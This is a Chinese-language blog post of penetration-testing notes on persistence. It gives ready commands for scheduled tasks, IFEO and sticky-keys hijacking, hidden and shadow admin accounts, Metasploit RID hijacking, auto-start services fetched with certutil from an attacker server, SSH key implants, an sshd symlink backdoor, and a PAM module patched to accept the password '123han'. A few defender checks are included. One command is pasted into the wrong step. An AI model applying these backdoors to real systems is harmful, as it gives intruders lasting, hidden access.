---
title: "权限维持"
permalink: persistence-techniques/
date: 2026-01-28 06:23:38
categories:
  - 网络安全
  - 内网渗透
tags:
  - 权限维持
  - 后门
  - 隐藏
img: /medias/featureimages/3.jpg
summary: "注册表、计划任务、服务、影子账户、SSP、LLMNR 等常见后门与维持手段及排查方式。"
---

<!-- more -->

**权限维持是获取到操作系统最高管理员后进行的内网渗透操作 （实际工作中需要有明确授权才能进行该步骤）**

## windows权限维持
## 计划任务
### 图形化

## 命令
+ **at**：windows  vista 之前的计划任务
+ **schtasks：** windows  vista  之后的计划任务

windows的缓存：`C:\Windows\Temp`

### 创建计划任务
`schtasks /create /tn 计划任务的名称 /tr 实际要运行的程序 /sc minute /mo 1  `

创建了一个名字叫 kls的计划任务，每分钟运行一次 C:\windows\temp\123.exe 文件

`schtasks /create /tn "kls" /tr "C:\windows\temp\123.exe" /sc minute /mo 1  `

因为攻击机没有开启监听

创建了一个名字叫 kls6 的计划任务，每周一早晨 6:00 执行一次 C:\windows\temp\10001.exe 文件

 `schtasks /create /tn "kls6" /tr "C:\windows\temp\123.exe" /sc weekly /d mon /st 06:00`

###  蓝队视角 - 入侵排查 - 删除计划任务

`schtasks /delete /tn 计划任务的名字  `

## 镜像劫持
HKLM\software\microsoft\windows nt\currentverison\image file execution options

### 劫持 notepad.exe 为 cmd.exe
`windows+R：regedit`

#### 1  在 image file execution options 新建项，项名是想劫持的文件名，如 notepad.exe

#### 2  新建一个字符串值 Debugger
`cat /root/.ssh/id_rsa.pub >> /root/.ssh/authotized_keys`

#### 3  修改 Debugger的值为目标文件的绝对路径 C:\windows\system32\cmd.exe

 打开记事本软件，实际打开的是 cmd

### 劫持无障碍工具
无障碍工具可以在windows的任何情况下运行，比如锁屏页面

+  粘滞键 sethc.exe 按5次shift触发
+ 放大镜 magnify.exe
+ 屏幕键盘 osk.exe
+ 轻松访问 utilman.exe
+ 讲述人 narrator.exe

####  劫持粘滞键

#### 劫持放大镜

## 后门用户
### 创建普通的管理员用户
`net user han 1qaz@WSX /add && net localgroup administrators han /add`

### 隐藏用户  $
windows 系统用户名后加 $ 代表隐藏用户

 `net user 用户名$ 密码 /add  `

 怎么发现隐藏用户？

#### 1 看用户组
`net   localgroup  administrators`

#### 2 控制面板

#### 3 注册表
HKLM\SAM\SAM

`默认没有权限查看  `

###  怎么删除隐藏用户？
`net  user  han2$  /del`

##  RID 劫持
 创建一个与 administrator 相同权限的 不受限制的管理员用户

### 1  先创建一个普通的隐藏用户

### 2  上线meterpreter

### 3  开始 rid 劫持
`use post/windows/manage/rid_hijack  `

```plain
msf post(windows/manage/rid_hijack) > set session 1
session => 1
msf post(windows/manage/rid_hijack) > set username a$
username => a$
msf post(windows/manage/rid_hijack) > options
```

#### 记得提权

劫持成功， a$ 就是 administrator 用户，登录 a$ 就是完整的管理员权限

##  影子账户
### 1  先创建一个隐藏用户
`net  user   b$  1qaz@WSX  /add`

### 2  打开注册表，找到 administrator 用户和对应的 hex 文件夹

### 3  复制 administrator hex 文件夹中对应的F值

 **选择完整，再 ctrl c 复制**

### 4  粘贴到 b$ 用户对应的 hex 文件夹的 F 值

### 5  分别导出 b$ 用户对应的文件夹 和 hex 文件夹

### 6  删除 b$ 用户

### 7  双击导入刚刚导出的 1.reg 和 2.reg

### 8  这时候系统中就会有一个实际不存在的用户 b$
该用户具有完整的管理员权限， b$ 用户 可以实现 RDP 远程登录

##  蓝队视角 ：如何排查影子账户
 影子账户只有在注册表中才能看到，其他位置均无法发现

## 开机自启动
###  注册表
 不登录、不启动

**HKLM\software\microsoft\windows\currentversion\run HKCU\software\microsoft\windows\currentversion\run**

## 服务开机自启动  service
 不登录、也启动

### 1 创建服务
服务使用exe，必须是特殊的exe，需要重新生成木马

cobaltstrike 也能实现

`sc create 服务名 binPath= "exe的路径" start= auto`

⚠️ binPath= "exe的路径" 和 start= auto 等于号的左边不能有空格，右边必须有空格

❌ `start   =   auto`

❌ `start=auto`

❌ `start   =auto`

✅ `start= auto`

certutil -urlcache -split -f http://云服务器IP:端口/12_service.exe

重启靶机等待

不登录，服务就会自动启动

入侵排查角度： 如何删除服务？

## 注册表与服务开机自启动区别：
注册表需要登录进去到桌面，服务开机自启动，无登录就可以上线

## Linux 权限维持
## ssh 公钥权限维持
1  生成公私钥对  （centos）

2  把公钥追加到 /root/.ssh/authorized_keys

`cat /root/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys`

3  把私钥传给攻击机，攻击机即可使用私钥登录目标的ssh服务

`ssh root@192.168.79.130 -i id_rsa`

##  ssh 软链接
 低版本的ssh服务中存在

1  寻找sshd位置

2  创建软链接

`ln -sf /usr/sbin/sshd /tmp/su`

**3  使用软链接启动新的 ssh 服务**

`/tmp/su -oPort=7777`

**新启动的7777端口的ssh服务，是匿名服务，使用任意密码均可登录**

## ssh 隐身登录
`ssh   -T    用户名@ip地址   /bin/bash   -i`

**w 查看 登录（看不到）**

## pam 后门
pam是什么： pam是linux的身份验证机制 （pam_unix.so）

攻击者替换原有的 pam 文件

1 找到靶机的pam在哪

`find / -name "pam_unix.so" 2>/dev/null`

`/usr/lib/x86_64-linux-gnu/security/pam_unix.so`

`docker中也有pam`

2 下载 pam 的源码 ，并解压

`https://ftp2.osuosl.org/pub/blfs/conglomeration/Linux-PAM/`

`wget https://ftp2.osuosl.org/pub/blfs/conglomeration/Linux-PAM/Linux-PAM-1.1.8.tar.bz2`

3 修改 pam 的源码

`Linux-PAM-1.1.8/modules/pam_unix/pam_unix_auth.c`

代码解释：判断用户输入的密码 p 和 123han 是否相等，如果相等就登录成功

4 编译 pam

安装 gcc

`apt    install    gcc    flex    make`

编译

**在 /home/yu/桌面/Linux-PAM-1.1.8 目录下 进行**

`./configure --prefix=/user --exec-prefix=/usr --localstatedir=/var --sysconfdir=/etc --disable-selinux --with-libiconv-prefix=/usr`

5 备份和替换系统原有的pam文件

`cp /usr/lib/x86_64-linux-gnu/security/pam_unix.so /usr/lib/x86_64-linux-gnu/security/pam_unix.so.bak`

`mv /home/yu/桌面/Linux-PAM-1.1.8/modules/pam_unix/.libs/pam_unix.so /usr/lib/x86_64-linux-gnu/security/pam_unix.so`

`/home/yu/Desktop/自己的路径`

6 这时，使用 123han 密码即可登录靶机任意用户的ssh服务，且靶机原有正确密码不受影响

### 原理：
正常pam

植入后门之后的pam
